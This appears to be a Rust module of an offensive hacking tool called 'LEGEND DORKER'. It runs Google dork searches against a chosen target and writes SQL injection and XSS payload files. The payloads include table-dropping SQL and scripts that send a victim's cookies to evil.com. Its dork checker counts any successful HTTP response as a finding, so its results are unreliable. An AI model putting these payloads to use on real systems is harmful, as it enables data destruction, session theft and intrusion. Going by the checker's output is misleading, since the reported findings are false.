use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use anyhow::Result;
use crate::{Database, Config, advanced_dorks};
use std::fs;
use rand::Rng;
use dialoguer::{theme::ColorfulTheme, Select};

pub async fn check_single(target: &str, db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", format!("🎯 LEGEND DORKER - Advanced Dork Checking: {}", target).bright_cyan().bold());
    
    // Let user choose category
    let categories = advanced_dorks::get_categories();
    let mut category_names: Vec<String> = categories.iter()
        .map(|(_, name)| format!("📁 {}", name))
        .collect();
    category_names.push("🎯 All Categories (100+ Dorks)".to_string());
    
    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select dork category")
        .items(&category_names)
        .default(0)
        .interact()?;
    
    let dork_templates = if selection == categories.len() {
        advanced_dorks::get_all_dorks()
    } else {
        advanced_dorks::get_dorks_by_category(categories[selection].0)
    };
    
    println!("\n{}", format!("🔥 Using {} advanced dork patterns", dork_templates.len()).bright_yellow().bold());
    
    let pb = ProgressBar::new(dork_templates.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("[{elapsed_precise}] {bar:40.cyan/blue} {pos}/{len} {msg}")
            .unwrap()
            .progress_chars("█▓▒░"),
    );
    
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(config.timeout))
        .user_agent(&config.user_agent)
        .build()?;
    
    for dork_template in dork_templates {
        let dork = dork_template.replace("{}", target);
        pb.set_message(format!("Checking: {}", &dork[..40.min(dork.len())]));
        
        // Simulate dork checking (in real implementation, this would query search engines)
        let search_url = format!("https://www.google.com/search?q={}", urlencoding::encode(&dork));
        
        match client.get(&search_url).send().await {
            Ok(response) => {
                if response.status().is_success() {
                    let result = format!("✓ Found: {}", dork);
                    println!("{}", result.green());
                    let _ = db.save_dork_result(target, &dork, "Found");
                } else {
                    if config.verbose {
                        println!("{}", format!("✗ Nothing: {}", dork).bright_black());
                    }
                    let _ = db.save_dork_result(target, &dork, "Not Found");
                }
            }
            Err(_) => {
                if config.verbose {
                    println!("{}", format!("⚠ Error checking: {}", dork).yellow());
                }
            }
        }
        
        pb.inc(1);
        tokio::time::sleep(tokio::time::Duration::from_millis(config.rate_limit)).await;
    }
    
    pb.finish_with_message("Dork checking complete!");
    println!("\n{}", "✅ Dork checking completed!".green().bold());
    
    Ok(())
}

pub async fn check_bulk(filepath: &str, db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", format!("📝 Loading targets from: {}", filepath).bright_cyan().bold());
    
    let contents = fs::read_to_string(filepath)?;
    let targets: Vec<&str> = contents.lines().filter(|l| !l.trim().is_empty()).collect();
    
    println!("{}", format!("Found {} targets", targets.len()).bright_yellow());
    
    for (i, target) in targets.iter().enumerate() {
        println!("\n{}", format!("[{}/{}] Processing: {}", i + 1, targets.len(), target).bright_magenta().bold());
        check_single(target, db, config).await?;
    }
    
    println!("\n{}", "✅ Bulk checking completed!".green().bold());
    Ok(())
}

pub async fn generate_dorks(db: &Database) -> Result<()> {
    println!("\n{}", "🎲 Generating random dorks...".bright_cyan().bold());
    
    let keywords = vec![
        "admin", "login", "dashboard", "panel", "user", "account", "profile",
        "config", "backup", "database", "sql", "upload", "file", "download",
        "password", "secret", "key", "token", "api", "auth", "session",
    ];
    
    let file_types = vec!["php", "asp", "aspx", "jsp", "sql", "txt", "xml", "json", "bak"];
    let operators = vec!["inurl", "intext", "intitle", "filetype", "ext"];
    
    let mut rng = rand::thread_rng();
    let mut generated = Vec::new();
    
    for _ in 0..50 {
        let keyword = keywords[rng.gen_range(0..keywords.len())];
        let operator = operators[rng.gen_range(0..operators.len())];
        
        let dork = if operator == "filetype" || operator == "ext" {
            let filetype = file_types[rng.gen_range(0..file_types.len())];
            format!("{}:{} {}", operator, filetype, keyword)
        } else {
            format!("{}:{}", operator, keyword)
        };
        
        generated.push(dork);
    }
    
    println!("\n{}", "📋 Generated Dorks:".bright_yellow().bold());
    for (i, dork) in generated.iter().enumerate() {
        println!("  {}. {}", i + 1, dork.bright_green());
    }
    
    // Save to file
    let output = generated.join("\n");
    fs::write("generated_dorks.txt", output)?;
    println!("\n{}", "💾 Dorks saved to generated_dorks.txt".green().bold());
    
    Ok(())
}

pub async fn view_results(db: &Database) -> Result<()> {
    println!("\n{}", "📊 Recent Dork Results:".bright_cyan().bold());
    println!("{}", "Feature coming soon - check the database directly".bright_yellow());
    Ok(())
}

pub async fn generate_sql_payloads(_db: &Database) -> Result<()> {
    println!("\n{}", "🎲 SQL Injection Payloads:".bright_cyan().bold());
    
    let payloads = vec![
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT database()--",
        "' UNION ALL SELECT version()--",
        "'; DROP TABLE users--",
        "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
        "' UNION SELECT @@version--",
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5('A'))--",
    ];
    
    for (i, payload) in payloads.iter().enumerate() {
        println!("  {}. {}", i + 1, payload.bright_green());
    }
    
    fs::write("sql_payloads.txt", payloads.join("\n"))?;
    println!("\n{}", "💾 Payloads saved to sql_payloads.txt".green().bold());
    
    Ok(())
}

pub async fn generate_xss_payloads(_db: &Database) -> Result<()> {
    println!("\n{}", "🔓 XSS Payloads:".bright_cyan().bold());
    
    let payloads = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<div onpointerover=alert('XSS')>",
        "javascript:alert('XSS')",
        "<script>fetch('http://evil.com?c='+document.cookie)</script>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "'><img src=x onerror=alert('XSS')>",
        "<script>document.write('<img src=\"http://evil.com?c='+document.cookie+'\">')</script>",
    ];
    
    for (i, payload) in payloads.iter().enumerate() {
        println!("  {}. {}", i + 1, payload.bright_green());
    }
    
    fs::write("xss_payloads.txt", payloads.join("\n"))?;
    println!("\n{}", "💾 Payloads saved to xss_payloads.txt".green().bold());
    
    Ok(())
}

pub async fn generate_keywords(base: &str, _db: &Database) -> Result<()> {
    println!("\n{}", format!("📝 Generating keywords based on: {}", base).bright_cyan().bold());
    
    let mutations = vec![
        format!("{}", base),
        format!("{}s", base),
        format!("{}ed", base),
        format!("{}ing", base),
        format!("{}er", base),
        format!("{}_admin", base),
        format!("{}_login", base),
        format!("{}_user", base),
        format!("{}_portal", base),
        format!("admin_{}", base),
        format!("user_{}", base),
        format!("{}_test", base),
        format!("{}_dev", base),
        format!("{}_backup", base),
        format!("{}-admin", base),
        format!("{}-login", base),
        format!("old_{}", base),
        format!("new_{}", base),
        format!("{}_old", base),
        format!("{}_new", base),
    ];
    
    for (i, keyword) in mutations.iter().enumerate() {
        println!("  {}. {}", i + 1, keyword.bright_green());
    }
    
    fs::write(format!("{}_keywords.txt", base), mutations.join("\n"))?;
    println!("\n{}", format!("💾 Keywords saved to {}_keywords.txt", base).green().bold());
    
    Ok(())
}

pub async fn generate_wordlist(_db: &Database, config: &Config) -> Result<()> {
    println!("\n{}", "🎯 Custom Wordlist Generator".bright_cyan().bold());
    println!("{}", "Generating common wordlist...".bright_yellow());
    
    let common_words = vec![
        "admin", "administrator", "root", "user", "guest", "test", "demo",
        "password", "pass", "passwd", "pwd", "secret", "key",
        "backup", "bak", "old", "new", "temp", "tmp", "dev", "prod",
        "api", "auth", "login", "logout", "register", "signup",
        "database", "db", "sql", "mysql", "postgres", "mongo",
        "config", "configuration", "settings", "setup", "install",
        "upload", "download", "file", "files", "media", "images",
        "private", "public", "hidden", "secure", "protected",
    ];
    
    let pb = ProgressBar::new(common_words.len() as u64);
    
    for word in &common_words {
        println!("  • {}", word.bright_green());
        pb.inc(1);
    }
    
    pb.finish();
    
    fs::write("custom_wordlist.txt", common_words.join("\n"))?;
    println!("\n{}", "💾 Wordlist saved to custom_wordlist.txt".green().bold());
    
    Ok(())
}
